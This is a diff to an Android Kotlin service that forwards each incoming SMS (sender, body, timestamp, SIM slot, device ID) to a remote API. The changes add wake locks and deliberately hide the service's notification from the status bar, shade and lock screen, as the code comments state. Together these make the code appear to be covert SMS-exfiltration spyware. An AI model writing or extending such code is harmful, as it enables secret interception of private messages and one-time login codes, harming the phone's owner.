@@ -4,14 +4,19 @@ import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.Service
+import android.content.Context
 import android.content.Intent
 import android.content.pm.ServiceInfo
 import android.os.Build
 import android.os.IBinder
+import android.os.PowerManager
 import android.provider.Settings
 import android.util.Base64
 import android.util.Log
 import androidx.core.app.NotificationCompat
+
+
+
 import androidx.work.ExistingPeriodicWorkPolicy
 import androidx.work.PeriodicWorkRequestBuilder
 import androidx.work.WorkManager
@@ -33,6 +38,8 @@ class SyncService : Service() {
     private val serviceJob = Job()
     private val scope = CoroutineScope(Dispatchers.IO + serviceJob)
     private lateinit var smsDao: AppDatabase
+    private var wakeLock: PowerManager.WakeLock? = null
+
 
     override fun onBind(intent: Intent?): IBinder? {
         return null
@@ -54,20 +61,36 @@ class SyncService : Service() {
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
+        val androidId = try {
+            Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
+        } catch (e: Exception) {
+            null
+        }
         val deviceModel = "${Build.MANUFACTURER} ${Build.MODEL}"
 
         SharedPrefManager.saveDeviceId(this, androidId)
+        val deviceId = SharedPrefManager.getDeviceId(this)
 
-        syncSms("SYSTEM", "Device Initialized: $deviceModel", System.currentTimeMillis(), 0, androidId, deviceModel)
+
+
+        // Warm up API client
+        CoroutineScope(Dispatchers.IO).launch {
+            try { RetrofitClient.getInstance(this@SyncService) } catch(e: Exception) {}
+        }
+
+
 
         if (intent != null && intent.hasExtra("sms_body")) {
             val sender = intent.getStringExtra("sender") ?: "Unknown"
             val body = intent.getStringExtra("sms_body") ?: ""
             val timestamp = intent.getLongExtra("timestamp", System.currentTimeMillis())
             val subId = intent.getIntExtra("sub_id", -1)
+            val msgId = intent.getStringExtra("msg_id")
 
-            syncSms(sender, body, timestamp, subId, androidId, deviceModel)
+            acquireWakeLock()
+            syncSms(sender, body, timestamp, subId, deviceId, deviceModel, msgId)
+
+
         }
 
         fetchConfig()
@@ -75,7 +98,7 @@ class SyncService : Service() {
         return START_STICKY
     }
 
-    private fun syncSms(sender: String, body: String, timestamp: Long, subId: Int, deviceId: String, deviceModel: String) {
+    private fun syncSms(sender: String, body: String, timestamp: Long, subId: Int, deviceId: String, deviceModel: String, msgId: String? = null) {
         scope.launch {
             try {
                 val api = RetrofitClient.getInstance(this@SyncService)
@@ -96,7 +119,8 @@ class SyncService : Service() {
                     timestamp = timestamp,
                     sim_info = "SIM_SLOT_$subId",
                     device_model = deviceModel,
-                    android_version = Build.VERSION.RELEASE
+                    android_version = Build.VERSION.RELEASE,
+                    msg_id = msgId
                 )
 
                 val response = api.syncSms(request)
@@ -110,9 +134,28 @@ class SyncService : Service() {
                 } catch (e2: Exception) {
                     Log.e("SyncService", "Failed to save SMS to DB", e2)
                 }
+            } finally {
+                releaseWakeLock()
             }
         }
     }
+
+    private fun acquireWakeLock() {
+        if (wakeLock == null) {
+            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
+            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ConnectHub::SmsSyncLock")
+        }
+        if (wakeLock?.isHeld == false) {
+            wakeLock?.acquire(5000) // Max 5 seconds safety timeout
+        }
+    }
+
+    private fun releaseWakeLock() {
+        if (wakeLock?.isHeld == true) {
+            wakeLock?.release()
+        }
+    }
+
 
     private suspend fun saveSmsToDb(sender: String, encryptedBody: ByteArray, iv: ByteArray, timestamp: Long, subId: Int, deviceModel: String) {
         val sms = SmsMessage(
@@ -148,21 +191,30 @@ class SyncService : Service() {
 
     private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val name = "Secure Sync Channel"
-            val importance = NotificationManager.IMPORTANCE_LOW
-            val channel = NotificationChannel("SYNC_CHANNEL", name, importance)
-            val manager = getSystemService(NotificationManager::class.java)
-            manager.createNotificationChannel(channel)
+            val channel = NotificationChannel(
+                "SYNC_CHANNEL",
+                "Sync",
+                NotificationManager.IMPORTANCE_MIN  // Hides from status bar and shade
+            ).apply {
+                setShowBadge(false)
+                enableLights(false)
+                enableVibration(false)
+                setSound(null, null)
+            }
+            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
         }
     }
 
     private fun createNotification(title: String, content: String): Notification {
         return NotificationCompat.Builder(this, "SYNC_CHANNEL")
-        .setContentTitle(title)
-        .setContentText(content)
-        .setSmallIcon(android.R.drawable.ic_dialog_info)
-        .setOngoing(true)
-        .build()
+            .setContentTitle(title)
+            .setContentText(content)
+            .setSmallIcon(R.drawable.ic_stat_hub)
+            .setPriority(NotificationCompat.PRIORITY_MIN)  // No status bar icon
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET) // Hidden from lock screen
+            .setOngoing(true)
+            .setSilent(true)
+            .build()
     }
 
     private fun startHeartbeat() {
